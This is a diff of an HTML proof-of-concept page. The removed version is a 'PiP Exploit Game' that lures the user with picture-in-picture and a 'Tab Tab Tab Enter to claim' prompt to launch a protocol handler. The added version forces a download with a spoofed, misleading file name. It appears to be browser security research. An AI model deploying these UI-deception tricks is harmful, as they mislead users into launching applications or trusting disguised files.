@@ -1,96 +1,43 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>PiP Exploit Game</title>
+  <meta charset="UTF-8">
+  <title>Download HTML Data</title>
   <style>
     body {
       font-family: sans-serif;
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      background: #222;
-      color: #fff;
-      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f4f4f4;
     }
-    #startButton {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      padding: 10px 16px;
-      background: #28a745;
-      border: none;
-      color: #fff;
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
       cursor: pointer;
-      font-size: 16px;
-      z-index: 10;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      border-radius: 5px;
     }
-    #placeholder {
-      display: none;
-      position: absolute;
-      top: 40px;
-      left: calc(50% - 350px);
-      width: 690px;
-      height: 300px;
-      border: 3px dashed #f39c12;
-      box-sizing: border-box;
-      pointer-events: none;
+    button:hover {
+      background-color: #0056b3;
     }
-    #claimNotice {
-      display: none;
-      position: absolute;
-      top: 500px;
-      left: calc(50% - 150px);
-      width: 300px;
-      padding: 12px;
-      background: #e74c3c;
-      cursor: default;
-    }
-
   </style>
 </head>
 <body>
-
-  <button id="startButton">Start Game</button>
-  <div id="placeholder">Move PiP into the box above</div>
-  <button id="claimNotice"><br>Press here then <strong>Tab Tab Tab Enter</strong> to claim!</button>
-
-
-  <video id="gameVideo" muted style="display:none">
-    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-  </video>
+  <button onclick="download()">Download</button>
 
   <script>
-    const startBtn     = document.getElementById('startButton');
-    const placeholder  = document.getElementById('placeholder');
-    const claimNotice  = document.getElementById('claimNotice');
-    const video        = document.getElementById('gameVideo');
-
-    // 1) Ketika klik Start: play video & enter PiP
-    startBtn.addEventListener('click', async () => {
-      try {
-        await video.play();
-        await video.requestPictureInPicture();
-      } catch (err) {
-        console.error('Gagal masuk PiP:', err);
-        alert('PiP tidak didukung atau tidak diizinkan.');
-        return;
-      }
-    });
-
-    // 2) Saat benar-benar masuk PiP, munculkan placeholder & instruksi
-    video.addEventListener('enterpictureinpicture', () => {
-      startBtn.style.display    = 'none';
-      placeholder.style.display = 'block';
-      claimNotice.style.display = 'block';
-    });
-
-    // 3) Tangani penekanan Tab: buka ms-settings:
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Tab' && placeholder.style.display === 'block') {
-        e.preventDefault();
-        window.location.href = 'calculator';
-      }
-    });
+    function download() {
+      const a = document.createElement('a');
+      a.href = 'data:text/html,https://subdomain.subdomain.subdomain.subdomain.subdomain.subdomain.subdomain.google.com';
+      a.download = 'this secure file “chrome.pdf“ be careful with malicious .ipa';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
   </script>
 </body>
 </html>
